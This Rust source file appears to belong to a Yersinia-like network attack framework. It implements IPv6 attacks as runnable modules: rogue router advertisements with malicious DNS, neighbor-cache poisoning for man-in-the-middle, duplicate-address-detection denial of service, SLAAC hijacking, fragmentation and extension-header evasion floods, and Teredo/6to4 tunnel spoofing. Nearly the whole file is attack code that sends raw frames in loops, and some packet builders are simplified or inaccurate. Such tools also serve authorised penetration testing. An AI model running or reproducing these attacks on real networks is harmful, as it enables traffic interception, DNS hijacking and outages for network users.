//! IPv6 Neighbor Discovery Attack Implementations

use super::packet::{Ipv6NdPacket, NeighborAdvertisement, RouterAdvertisement};
use async_trait::async_trait;
use std::net::Ipv6Addr;
use std::sync::atomic::Ordering;
use std::time::Duration;
use tokio::time;
use yersinia_core::{Attack, AttackContext, AttackStats, Result};
use yersinia_packet::{EtherType, EthernetFrame, MacAddress};

/// Rogue Router Advertisement Attack
///
/// Sends malicious Router Advertisement messages to advertise a fake
/// default gateway, hijacking IPv6 traffic or causing denial of service
/// by advertising invalid configuration.
#[derive(Debug, Clone)]
pub struct RogueRouterAdvertisementAttack {
    /// Router MAC address
    pub router_mac: [u8; 6],
    /// Router IPv6 address
    pub router_addr: Ipv6Addr,
    /// Prefix to advertise for SLAAC
    pub prefix: Ipv6Addr,
    /// Prefix length
    pub prefix_len: u8,
    /// Router lifetime (0 = DoS by removing default route)
    pub router_lifetime: u16,
    /// Malicious DNS servers
    pub dns_servers: Vec<Ipv6Addr>,
    /// Advertisement interval (ms)
    pub interval_ms: u32,
    /// Valid lifetime for prefix
    pub valid_lifetime: u32,
    /// Preferred lifetime for prefix
    pub preferred_lifetime: u32,
    /// Set managed flag (force DHCPv6)
    pub managed_flag: bool,
}

impl RogueRouterAdvertisementAttack {
    pub fn new(router_mac: [u8; 6], router_addr: Ipv6Addr, prefix: Ipv6Addr) -> Self {
        Self {
            router_mac,
            router_addr,
            prefix,
            prefix_len: 64,
            router_lifetime: 1800,
            dns_servers: vec![],
            interval_ms: 3000,
            valid_lifetime: 86400,
            preferred_lifetime: 14400,
            managed_flag: false,
        }
    }

    /// DoS mode: advertise router with lifetime 0 to remove default route
    pub fn dos_mode(mut self) -> Self {
        self.router_lifetime = 0;
        self.valid_lifetime = 0;
        self.preferred_lifetime = 0;
        self
    }

    /// Hijack mode: provide malicious DNS
    pub fn with_malicious_dns(mut self, dns: Vec<Ipv6Addr>) -> Self {
        self.dns_servers = dns;
        self
    }

    /// Force DHCPv6 mode
    pub fn force_dhcpv6(mut self) -> Self {
        self.managed_flag = true;
        self
    }

    pub fn build_packet(&self) -> Ipv6NdPacket {
        let mut ra = RouterAdvertisement::new();
        ra.router_lifetime = self.router_lifetime;
        ra.managed_flag = self.managed_flag;

        ra = ra.with_source_ll(self.router_mac);

        if self.router_lifetime > 0 {
            ra = ra.with_prefix(
                self.prefix,
                self.prefix_len,
                self.valid_lifetime,
                self.preferred_lifetime,
            );
        }

        if !self.dns_servers.is_empty() {
            ra = ra.with_rdnss(self.valid_lifetime, self.dns_servers.clone());
        }

        Ipv6NdPacket::RouterAdvertisement(ra)
    }
}

/// NDP (Neighbor Discovery Protocol) Poisoning Attack
///
/// Sends fake Neighbor Advertisement messages to poison the neighbor
/// cache of victims, redirecting IPv6 traffic through the attacker
/// for man-in-the-middle attacks.
#[derive(Debug, Clone)]
pub struct NdpPoisoningAttack {
    /// Target IPv6 address to impersonate
    pub target_ipv6: Ipv6Addr,
    /// Attacker's MAC address (to redirect traffic)
    pub attacker_mac: [u8; 6],
    /// Whether to advertise as a router
    pub router_flag: bool,
    /// Override existing cache entries
    pub override_flag: bool,
    /// Send unsolicited advertisements
    pub unsolicited: bool,
    /// Advertisement rate (packets/sec)
    pub rate_pps: u32,
    /// Victim IPv6 addresses (None = broadcast to all-nodes)
    pub victims: Option<Vec<Ipv6Addr>>,
}

impl NdpPoisoningAttack {
    pub fn new(target_ipv6: Ipv6Addr, attacker_mac: [u8; 6]) -> Self {
        Self {
            target_ipv6,
            attacker_mac,
            router_flag: false,
            override_flag: true,
            unsolicited: true,
            rate_pps: 1,
            victims: None,
        }
    }

    pub fn impersonate_router(mut self) -> Self {
        self.router_flag = true;
        self
    }

    pub fn target_victims(mut self, victims: Vec<Ipv6Addr>) -> Self {
        self.victims = Some(victims);
        self
    }

    pub fn with_rate(mut self, rate_pps: u32) -> Self {
        self.rate_pps = rate_pps;
        self
    }

    pub fn build_packet(&self) -> Ipv6NdPacket {
        let mut na = NeighborAdvertisement::new(self.target_ipv6, self.router_flag);
        na.solicited_flag = !self.unsolicited;
        na.override_flag = self.override_flag;
        na = na.with_target_ll(self.attacker_mac);

        Ipv6NdPacket::NeighborAdvertisement(na)
    }
}

/// DAD (Duplicate Address Detection) DoS Attack
///
/// Exploits IPv6's Duplicate Address Detection mechanism by responding
/// to every Neighbor Solicitation with a fake Neighbor Advertisement,
/// claiming all addresses are already in use and preventing legitimate
/// nodes from configuring IPv6 addresses.
#[derive(Debug, Clone)]
pub struct DadDosAttack {
    /// Attacker's MAC address
    pub attacker_mac: [u8; 6],
    /// Respond to all DAD attempts
    pub respond_to_all: bool,
    /// Specific addresses to DoS (if not responding to all)
    pub target_addresses: Vec<Ipv6Addr>,
    /// Whether to also send unsolicited NAs preemptively
    pub preemptive_mode: bool,
    /// Rate for preemptive advertisements (pps)
    pub preemptive_rate_pps: u32,
}

impl DadDosAttack {
    pub fn new(attacker_mac: [u8; 6]) -> Self {
        Self {
            attacker_mac,
            respond_to_all: true,
            target_addresses: vec![],
            preemptive_mode: false,
            preemptive_rate_pps: 10,
        }
    }

    pub fn target_specific(mut self, addresses: Vec<Ipv6Addr>) -> Self {
        self.respond_to_all = false;
        self.target_addresses = addresses;
        self
    }

    pub fn with_preemptive(mut self, rate_pps: u32) -> Self {
        self.preemptive_mode = true;
        self.preemptive_rate_pps = rate_pps;
        self
    }

    /// Build response to DAD Neighbor Solicitation
    pub fn build_dad_response(&self, target_addr: Ipv6Addr) -> Ipv6NdPacket {
        let mut na = NeighborAdvertisement::new(target_addr, false);
        na.solicited_flag = true;
        na.override_flag = true;
        na = na.with_target_ll(self.attacker_mac);

        Ipv6NdPacket::NeighborAdvertisement(na)
    }

    /// Build preemptive NA to claim address before DAD
    pub fn build_preemptive_na(&self, target_addr: Ipv6Addr) -> Ipv6NdPacket {
        let mut na = NeighborAdvertisement::new(target_addr, false);
        na.solicited_flag = false; // Unsolicited
        na.override_flag = true;
        na = na.with_target_ll(self.attacker_mac);

        Ipv6NdPacket::NeighborAdvertisement(na)
    }
}

/// SLAAC (Stateless Address Autoconfiguration) Attack
///
/// Manipulates SLAAC by sending router advertisements with specific
/// prefixes and configurations to force clients into desired network
/// configurations or isolate them from the legitimate network.
#[derive(Debug, Clone)]
pub struct SlaacAttack {
    /// Attacker router MAC
    pub router_mac: [u8; 6],
    /// Malicious prefix to advertise
    pub malicious_prefix: Ipv6Addr,
    /// Prefix length
    pub prefix_len: u8,
    /// Very short lifetimes to force reconfiguration
    pub short_lifetimes: bool,
    /// Valid lifetime
    pub valid_lifetime: u32,
    /// Preferred lifetime
    pub preferred_lifetime: u32,
    /// Attack mode
    pub mode: SlaacAttackMode,
    /// Advertisement rate (packets/sec)
    pub rate_pps: u32,
}

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum SlaacAttackMode {
    /// Advertise bogus prefix to isolate clients
    Isolation,
    /// Advertise overlapping prefix to hijack traffic
    Hijacking,
    /// Rapid reconfiguration to cause DoS
    Churn,
}

impl SlaacAttack {
    pub fn new(router_mac: [u8; 6], malicious_prefix: Ipv6Addr) -> Self {
        Self {
            router_mac,
            malicious_prefix,
            prefix_len: 64,
            short_lifetimes: false,
            valid_lifetime: 86400,
            preferred_lifetime: 14400,
            mode: SlaacAttackMode::Hijacking,
            rate_pps: 1,
        }
    }

    pub fn isolation_mode(mut self) -> Self {
        self.mode = SlaacAttackMode::Isolation;
        self.malicious_prefix = "fd00::".parse().unwrap(); // ULA prefix
        self
    }

    pub fn churn_mode(mut self) -> Self {
        self.mode = SlaacAttackMode::Churn;
        self.short_lifetimes = true;
        self.valid_lifetime = 10;
        self.preferred_lifetime = 5;
        self.rate_pps = 10;
        self
    }

    pub fn build_packet(&self) -> Ipv6NdPacket {
        let lifetimes = (self.valid_lifetime, self.preferred_lifetime);

        let mut ra = RouterAdvertisement::new();
        ra = ra.with_source_ll(self.router_mac);
        ra = ra.with_prefix(
            self.malicious_prefix,
            self.prefix_len,
            lifetimes.0,
            lifetimes.1,
        );

        // In churn mode, vary the prefix slightly each time
        if self.mode == SlaacAttackMode::Churn {
            ra.router_lifetime = 10;
        }

        Ipv6NdPacket::RouterAdvertisement(ra)
    }

    /// Generate varying prefix for churn mode
    pub fn generate_churn_prefix(&self) -> Ipv6Addr {
        let mut octets = self.malicious_prefix.octets();
        // Randomize last bytes of prefix
        octets[6] = rand::random();
        octets[7] = rand::random();
        Ipv6Addr::from(octets)
    }
}

/// IPv6 Fragmentation Attack
///
/// Exploits IPv6 fragmentation to bypass security controls, evade IDS/IPS,
/// or cause resource exhaustion by sending overlapping or malformed fragments.
#[derive(Debug, Clone)]
pub struct Ipv6FragmentationAttack {
    /// Source IPv6 address
    pub source_addr: Ipv6Addr,
    /// Destination IPv6 address
    pub dest_addr: Ipv6Addr,
    /// Attack mode
    pub mode: FragmentationMode,
    /// Fragment size (bytes)
    pub fragment_size: u16,
    /// Number of fragments per packet
    pub fragments_per_packet: u8,
    /// Overlap size for overlapping fragments
    pub overlap_bytes: u16,
    /// Rate of fragmented packets (pps)
    pub rate_pps: u32,
}

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum FragmentationMode {
    /// Send overlapping fragments with different data
    Overlapping,
    /// Send out-of-order fragments
    OutOfOrder,
    /// Send tiny fragments to exhaust reassembly buffers
    TinyFragments,
    /// Send fragments with invalid offset values
    InvalidOffsets,
    /// Fragment flood to exhaust resources
    FragmentFlood,
}

impl Ipv6FragmentationAttack {
    pub fn new(source_addr: Ipv6Addr, dest_addr: Ipv6Addr) -> Self {
        Self {
            source_addr,
            dest_addr,
            mode: FragmentationMode::Overlapping,
            fragment_size: 512,
            fragments_per_packet: 4,
            overlap_bytes: 64,
            rate_pps: 10,
        }
    }

    pub fn tiny_fragments_mode(mut self) -> Self {
        self.mode = FragmentationMode::TinyFragments;
        self.fragment_size = 8; // Minimum fragment size
        self.fragments_per_packet = 255; // Maximum
        self
    }

    pub fn fragment_flood_mode(mut self) -> Self {
        self.mode = FragmentationMode::FragmentFlood;
        self.rate_pps = 1000;
        self
    }

    pub fn overlapping_mode(mut self, overlap_bytes: u16) -> Self {
        self.mode = FragmentationMode::Overlapping;
        self.overlap_bytes = overlap_bytes;
        self
    }

    /// Build fragmented packet (simplified representation)
    pub fn build_fragments(&self) -> Vec<Vec<u8>> {
        let mut fragments = Vec::new();

        for i in 0..self.fragments_per_packet {
            let mut fragment = Vec::new();

            // IPv6 header (40 bytes) + Fragment header (8 bytes)
            fragment.extend_from_slice(&self.source_addr.octets());
            fragment.extend_from_slice(&self.dest_addr.octets());

            // Fragment offset and flags
            let offset = match self.mode {
                FragmentationMode::Overlapping => {
                    if i > 0 {
                        (i as u16 * self.fragment_size) - self.overlap_bytes
                    } else {
                        0
                    }
                }
                FragmentationMode::OutOfOrder => {
                    // Reverse order
                    (self.fragments_per_packet - i - 1) as u16 * self.fragment_size
                }
                FragmentationMode::InvalidOffsets => {
                    // Random invalid offsets
                    0xFFFF - i as u16
                }
                _ => i as u16 * self.fragment_size,
            };

            fragment.extend_from_slice(&offset.to_be_bytes());

            // Fragment payload
            fragment.extend(vec![0xAA; self.fragment_size as usize]);

            fragments.push(fragment);
        }

        fragments
    }
}

/// IPv6 Extension Headers Manipulation Attack
///
/// Crafts packets with malicious or malformed extension headers to:
/// - Evade security devices that don't parse all extension headers
/// - Exploit implementation vulnerabilities
/// - Cause resource exhaustion through deep header chains
#[derive(Debug, Clone)]
pub struct ExtensionHeadersAttack {
    /// Source IPv6 address
    pub source_addr: Ipv6Addr,
    /// Destination IPv6 address
    pub dest_addr: Ipv6Addr,
    /// Attack mode
    pub mode: ExtensionHeaderMode,
    /// Number of chained extension headers
    pub header_chain_depth: u8,
    /// Include routing header
    pub include_routing: bool,
    /// Include hop-by-hop options
    pub include_hop_by_hop: bool,
    /// Include destination options
    pub include_dest_options: bool,
    /// Rate (packets/sec)
    pub rate_pps: u32,
}

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum ExtensionHeaderMode {
    /// Chain many extension headers to evade inspection
    DeepChain,
    /// Use Type 0 Routing Header (deprecated, amplification)
    RoutingHeaderType0,
    /// Pad options to maximum size
    MaximumPadding,
    /// Unknown/experimental extension header types
    UnknownTypes,
    /// Conflicting header combinations
    ConflictingHeaders,
}

impl ExtensionHeadersAttack {
    pub fn new(source_addr: Ipv6Addr, dest_addr: Ipv6Addr) -> Self {
        Self {
            source_addr,
            dest_addr,
            mode: ExtensionHeaderMode::DeepChain,
            header_chain_depth: 8,
            include_routing: false,
            include_hop_by_hop: true,
            include_dest_options: true,
            rate_pps: 10,
        }
    }

    pub fn routing_header_amplification(mut self) -> Self {
        self.mode = ExtensionHeaderMode::RoutingHeaderType0;
        self.include_routing = true;
        self
    }

    pub fn deep_chain_evasion(mut self, depth: u8) -> Self {
        self.mode = ExtensionHeaderMode::DeepChain;
        self.header_chain_depth = depth;
        self
    }

    pub fn maximum_padding(mut self) -> Self {
        self.mode = ExtensionHeaderMode::MaximumPadding;
        self
    }

    /// Build packet with malicious extension headers
    pub fn build_packet(&self) -> Vec<u8> {
        let mut packet = Vec::new();

        // Basic IPv6 header
        packet.extend_from_slice(&[0x60, 0x00, 0x00, 0x00]); // Version, traffic class, flow label
        packet.extend_from_slice(&[0x00, 0x00]); // Payload length (will be set later)

        // Next header depends on mode
        let next_header = if self.include_hop_by_hop {
            0 // Hop-by-Hop Options
        } else if self.include_routing {
            43 // Routing Header
        } else if self.include_dest_options {
            60 // Destination Options
        } else {
            59 // No Next Header
        };

        packet.push(next_header);
        packet.push(64); // Hop limit

        packet.extend_from_slice(&self.source_addr.octets());
        packet.extend_from_slice(&self.dest_addr.octets());

        // Add extension headers based on mode
        for i in 0..self.header_chain_depth {
            match self.mode {
                ExtensionHeaderMode::DeepChain => {
                    // Alternating Hop-by-Hop and Destination Options
                    if i % 2 == 0 {
                        packet.extend_from_slice(&[60, 0, 1, 0]); // Dest Options
                    } else {
                        packet.extend_from_slice(&[0, 0, 1, 0]); // Hop-by-Hop
                    }
                }
                ExtensionHeaderMode::MaximumPadding => {
                    // Pad to maximum allowed size
                    packet.extend_from_slice(&[60, 255]); // Dest Options with max length
                    packet.extend(vec![0; 2046]); // Maximum padding
                }
                ExtensionHeaderMode::UnknownTypes => {
                    // Use experimental header types
                    packet.extend_from_slice(&[253 + (i % 2), 0, 1, 0]);
                }
                _ => {}
            }
        }

        packet
    }
}

/// Teredo/6to4 Tunnel Attack
///
/// Exploits IPv6 transition mechanisms (Teredo, 6to4) to:
/// - Bypass IPv4-only firewalls
/// - Establish covert channels
/// - Exploit tunnel relay impersonation
#[derive(Debug, Clone)]
pub struct TeredoTunnelAttack {
    /// Attack mode
    pub mode: TunnelAttackMode,
    /// Teredo server address (for Teredo attacks)
    pub teredo_server: Option<Ipv6Addr>,
    /// 6to4 relay address
    pub relay_addr: Option<Ipv6Addr>,
    /// Spoofed IPv4 address
    pub spoofed_ipv4: std::net::Ipv4Addr,
    /// Attacker's real IPv6 address
    pub attacker_ipv6: Ipv6Addr,
    /// Target IPv6 address
    pub target_ipv6: Ipv6Addr,
    /// Rate (packets/sec)
    pub rate_pps: u32,
}

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum TunnelAttackMode {
    /// Impersonate Teredo relay to intercept traffic
    TeredoRelayImpersonation,
    /// Inject traffic through 6to4
    SixToFourInjection,
    /// Exploit tunnel endpoint spoofing
    TunnelSpoofing,
    /// Bypass firewall via tunnel
    FirewallBypass,
}

impl TeredoTunnelAttack {
    pub fn new(attacker_ipv6: Ipv6Addr, target_ipv6: Ipv6Addr) -> Self {
        Self {
            mode: TunnelAttackMode::TeredoRelayImpersonation,
            teredo_server: Some("2001:0:4136:e378:8000:63bf:3fff:fdd2".parse().unwrap()),
            relay_addr: None,
            spoofed_ipv4: "192.0.2.1".parse().unwrap(),
            attacker_ipv6,
            target_ipv6,
            rate_pps: 10,
        }
    }

    pub fn teredo_relay_attack(mut self, server: Ipv6Addr) -> Self {
        self.mode = TunnelAttackMode::TeredoRelayImpersonation;
        self.teredo_server = Some(server);
        self
    }

    pub fn six_to_four_injection(mut self, relay: Ipv6Addr) -> Self {
        self.mode = TunnelAttackMode::SixToFourInjection;
        self.relay_addr = Some(relay);
        self
    }

    pub fn firewall_bypass(mut self) -> Self {
        self.mode = TunnelAttackMode::FirewallBypass;
        self
    }

    /// Build tunneled packet
    pub fn build_tunneled_packet(&self) -> Vec<u8> {
        let mut packet = Vec::new();

        match self.mode {
            TunnelAttackMode::TeredoRelayImpersonation => {
                // UDP header for Teredo (port 3544)
                packet.extend_from_slice(&[0x0D, 0xD8]); // Source port 3544
                packet.extend_from_slice(&[0x0D, 0xD8]); // Dest port 3544
                packet.extend_from_slice(&[0x00, 0x00]); // Length
                packet.extend_from_slice(&[0x00, 0x00]); // Checksum

                // Teredo authentication header (optional)
                // Inner IPv6 packet
                packet.extend_from_slice(&self.attacker_ipv6.octets());
                packet.extend_from_slice(&self.target_ipv6.octets());
            }
            TunnelAttackMode::SixToFourInjection => {
                // 6to4 uses 2002::/16 prefix
                // Encapsulate IPv6 in IPv4
                packet.push(0x60); // IPv6 version
                packet.extend_from_slice(&self.attacker_ipv6.octets());
                packet.extend_from_slice(&self.target_ipv6.octets());
            }
            TunnelAttackMode::FirewallBypass | TunnelAttackMode::TunnelSpoofing => {
                // Generic tunnel with spoofed source
                packet.extend_from_slice(&self.spoofed_ipv4.octets());
                packet.extend_from_slice(&self.attacker_ipv6.octets());
                packet.extend_from_slice(&self.target_ipv6.octets());
            }
        }

        packet
    }
}

#[async_trait]
impl Attack for RogueRouterAdvertisementAttack {
    async fn execute(&self, ctx: AttackContext) -> Result<()> {
        let interval = Duration::from_millis(self.interval_ms as u64);

        while ctx.running.load(Ordering::Relaxed) {
            while ctx.paused.load(Ordering::Relaxed) && ctx.running.load(Ordering::Relaxed) {
                time::sleep(Duration::from_millis(100)).await;
            }
            if !ctx.running.load(Ordering::Relaxed) {
                break;
            }

            let nd_bytes = self.build_packet().to_bytes();
            let frame = EthernetFrame::new(
                MacAddress([0x33, 0x33, 0x00, 0x00, 0x00, 0x01]), // IPv6 all-nodes multicast
                MacAddress(self.router_mac),
                EtherType::IPv6,
                nd_bytes,
            );
            if ctx.interface.send_raw(&frame.to_bytes()).is_err() {
                ctx.stats.increment_errors();
            } else {
                ctx.stats.increment_packets_sent();
            }
            time::sleep(interval).await;
        }
        Ok(())
    }
    fn pause(&self) {}
    fn resume(&self) {}
    fn stop(&self) {}
    fn stats(&self) -> AttackStats {
        AttackStats::default()
    }
    fn name(&self) -> &str {
        "Rogue Router Advertisement"
    }
}

#[async_trait]
impl Attack for NdpPoisoningAttack {
    async fn execute(&self, ctx: AttackContext) -> Result<()> {
        let interval = Duration::from_micros(1_000_000 / self.rate_pps.max(1) as u64);

        while ctx.running.load(Ordering::Relaxed) {
            while ctx.paused.load(Ordering::Relaxed) && ctx.running.load(Ordering::Relaxed) {
                time::sleep(Duration::from_millis(100)).await;
            }
            if !ctx.running.load(Ordering::Relaxed) {
                break;
            }

            let nd_bytes = self.build_packet().to_bytes();
            let dest_mac = if self.victims.is_some() {
                MacAddress([0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF]) // Unicast to specific victims
            } else {
                MacAddress([0x33, 0x33, 0x00, 0x00, 0x00, 0x01]) // All-nodes multicast
            };

            let frame = EthernetFrame::new(
                dest_mac,
                MacAddress(self.attacker_mac),
                EtherType::IPv6,
                nd_bytes,
            );
            if ctx.interface.send_raw(&frame.to_bytes()).is_err() {
                ctx.stats.increment_errors();
            } else {
                ctx.stats.increment_packets_sent();
            }
            time::sleep(interval).await;
        }
        Ok(())
    }
    fn pause(&self) {}
    fn resume(&self) {}
    fn stop(&self) {}
    fn stats(&self) -> AttackStats {
        AttackStats::default()
    }
    fn name(&self) -> &str {
        "NDP Poisoning"
    }
}

#[async_trait]
impl Attack for DadDosAttack {
    async fn execute(&self, ctx: AttackContext) -> Result<()> {
        // For preemptive mode, send NAs periodically
        if self.preemptive_mode {
            let interval =
                Duration::from_micros(1_000_000 / self.preemptive_rate_pps.max(1) as u64);
            let targets = if self.target_addresses.is_empty() {
                vec!["fe80::1".parse().unwrap(), "2001:db8::1".parse().unwrap()]
            } else {
                self.target_addresses.clone()
            };

            while ctx.running.load(Ordering::Relaxed) {
                while ctx.paused.load(Ordering::Relaxed) && ctx.running.load(Ordering::Relaxed) {
                    time::sleep(Duration::from_millis(100)).await;
                }
                if !ctx.running.load(Ordering::Relaxed) {
                    break;
                }

                for target in &targets {
                    let nd_bytes = self.build_preemptive_na(*target).to_bytes();
                    let frame = EthernetFrame::new(
                        MacAddress([0x33, 0x33, 0x00, 0x00, 0x00, 0x01]),
                        MacAddress(self.attacker_mac),
                        EtherType::IPv6,
                        nd_bytes,
                    );
                    if ctx.interface.send_raw(&frame.to_bytes()).is_err() {
                        ctx.stats.increment_errors();
                    } else {
                        ctx.stats.increment_packets_sent();
                    }
                }
                time::sleep(interval).await;
            }
        } else {
            // Passive mode - would respond to NS (needs packet sniffing)
            time::sleep(Duration::from_secs(3600)).await; // Sleep indefinitely
        }
        Ok(())
    }
    fn pause(&self) {}
    fn resume(&self) {}
    fn stop(&self) {}
    fn stats(&self) -> AttackStats {
        AttackStats::default()
    }
    fn name(&self) -> &str {
        "DAD DoS"
    }
}

#[async_trait]
impl Attack for SlaacAttack {
    async fn execute(&self, ctx: AttackContext) -> Result<()> {
        let interval = Duration::from_micros(1_000_000 / self.rate_pps.max(1) as u64);

        while ctx.running.load(Ordering::Relaxed) {
            while ctx.paused.load(Ordering::Relaxed) && ctx.running.load(Ordering::Relaxed) {
                time::sleep(Duration::from_millis(100)).await;
            }
            if !ctx.running.load(Ordering::Relaxed) {
                break;
            }

            let nd_bytes = self.build_packet().to_bytes();
            let frame = EthernetFrame::new(
                MacAddress([0x33, 0x33, 0x00, 0x00, 0x00, 0x01]),
                MacAddress(self.router_mac),
                EtherType::IPv6,
                nd_bytes,
            );
            if ctx.interface.send_raw(&frame.to_bytes()).is_err() {
                ctx.stats.increment_errors();
            } else {
                ctx.stats.increment_packets_sent();
            }
            time::sleep(interval).await;
        }
        Ok(())
    }
    fn pause(&self) {}
    fn resume(&self) {}
    fn stop(&self) {}
    fn stats(&self) -> AttackStats {
        AttackStats::default()
    }
    fn name(&self) -> &str {
        "SLAAC Attack"
    }
}

#[async_trait]
impl Attack for Ipv6FragmentationAttack {
    async fn execute(&self, ctx: AttackContext) -> Result<()> {
        let interval = Duration::from_micros(1_000_000 / self.rate_pps.max(1) as u64);

        while ctx.running.load(Ordering::Relaxed) {
            while ctx.paused.load(Ordering::Relaxed) && ctx.running.load(Ordering::Relaxed) {
                time::sleep(Duration::from_millis(100)).await;
            }
            if !ctx.running.load(Ordering::Relaxed) {
                break;
            }

            let fragments = self.build_fragments();
            for frag_bytes in fragments {
                let frame = EthernetFrame::new(
                    MacAddress([0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF]),
                    MacAddress(ctx.interface.mac_address.0),
                    EtherType::IPv6,
                    frag_bytes,
                );
                if ctx.interface.send_raw(&frame.to_bytes()).is_err() {
                    ctx.stats.increment_errors();
                } else {
                    ctx.stats.increment_packets_sent();
                }
            }
            time::sleep(interval).await;
        }
        Ok(())
    }
    fn pause(&self) {}
    fn resume(&self) {}
    fn stop(&self) {}
    fn stats(&self) -> AttackStats {
        AttackStats::default()
    }
    fn name(&self) -> &str {
        "IPv6 Fragmentation Attack"
    }
}

#[async_trait]
impl Attack for ExtensionHeadersAttack {
    async fn execute(&self, ctx: AttackContext) -> Result<()> {
        let interval = Duration::from_micros(1_000_000 / self.rate_pps.max(1) as u64);

        while ctx.running.load(Ordering::Relaxed) {
            while ctx.paused.load(Ordering::Relaxed) && ctx.running.load(Ordering::Relaxed) {
                time::sleep(Duration::from_millis(100)).await;
            }
            if !ctx.running.load(Ordering::Relaxed) {
                break;
            }

            let ext_header_bytes = self.build_packet();
            let frame = EthernetFrame::new(
                MacAddress([0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF]),
                MacAddress(ctx.interface.mac_address.0),
                EtherType::IPv6,
                ext_header_bytes,
            );
            if ctx.interface.send_raw(&frame.to_bytes()).is_err() {
                ctx.stats.increment_errors();
            } else {
                ctx.stats.increment_packets_sent();
            }
            time::sleep(interval).await;
        }
        Ok(())
    }
    fn pause(&self) {}
    fn resume(&self) {}
    fn stop(&self) {}
    fn stats(&self) -> AttackStats {
        AttackStats::default()
    }
    fn name(&self) -> &str {
        "Extension Headers Attack"
    }
}

#[async_trait]
impl Attack for TeredoTunnelAttack {
    async fn execute(&self, ctx: AttackContext) -> Result<()> {
        let interval = Duration::from_micros(1_000_000 / self.rate_pps.max(1) as u64);

        while ctx.running.load(Ordering::Relaxed) {
            while ctx.paused.load(Ordering::Relaxed) && ctx.running.load(Ordering::Relaxed) {
                time::sleep(Duration::from_millis(100)).await;
            }
            if !ctx.running.load(Ordering::Relaxed) {
                break;
            }

            let tunnel_bytes = self.build_tunneled_packet();
            let frame = EthernetFrame::new(
                MacAddress([0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF]),
                MacAddress(ctx.interface.mac_address.0),
                EtherType::IPv4, // Tunneled over IPv4
                tunnel_bytes,
            );
            if ctx.interface.send_raw(&frame.to_bytes()).is_err() {
                ctx.stats.increment_errors();
            } else {
                ctx.stats.increment_packets_sent();
            }
            time::sleep(interval).await;
        }
        Ok(())
    }
    fn pause(&self) {}
    fn resume(&self) {}
    fn stop(&self) {}
    fn stats(&self) -> AttackStats {
        AttackStats::default()
    }
    fn name(&self) -> &str {
        "Teredo/6to4 Tunnel Attack"
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_rogue_ra_attack() {
        let attack = RogueRouterAdvertisementAttack::new(
            [0x11, 0x22, 0x33, 0x44, 0x55, 0x66],
            "fe80::1".parse().unwrap(),
            "2001:db8::".parse().unwrap(),
        );

        let packet = attack.build_packet();
        assert!(matches!(packet, Ipv6NdPacket::RouterAdvertisement(_)));
    }

    #[test]
    fn test_rogue_ra_dos() {
        let attack = RogueRouterAdvertisementAttack::new(
            [0xAA, 0xBB, 0xCC, 0xDD, 0xEE, 0xFF],
            "fe80::bad".parse().unwrap(),
            "2001:db8::".parse().unwrap(),
        )
        .dos_mode();

        assert_eq!(attack.router_lifetime, 0);
    }

    #[test]
    fn test_ndp_poisoning() {
        let attack = NdpPoisoningAttack::new(
            "2001:db8::1".parse().unwrap(),
            [0x12, 0x34, 0x56, 0x78, 0x9A, 0xBC],
        )
        .impersonate_router();

        let packet = attack.build_packet();
        assert!(matches!(packet, Ipv6NdPacket::NeighborAdvertisement(_)));
    }

    #[test]
    fn test_dad_dos() {
        let attack = DadDosAttack::new([0xFF, 0xEE, 0xDD, 0xCC, 0xBB, 0xAA]);
        let response = attack.build_dad_response("2001:db8::100".parse().unwrap());

        assert!(matches!(response, Ipv6NdPacket::NeighborAdvertisement(_)));
    }

    #[test]
    fn test_slaac_attack() {
        let attack = SlaacAttack::new(
            [0x00, 0x11, 0x22, 0x33, 0x44, 0x55],
            "fd00:bad::".parse().unwrap(),
        )
        .isolation_mode();

        let packet = attack.build_packet();
        assert!(matches!(packet, Ipv6NdPacket::RouterAdvertisement(_)));
        assert_eq!(attack.mode, SlaacAttackMode::Isolation);
    }
}
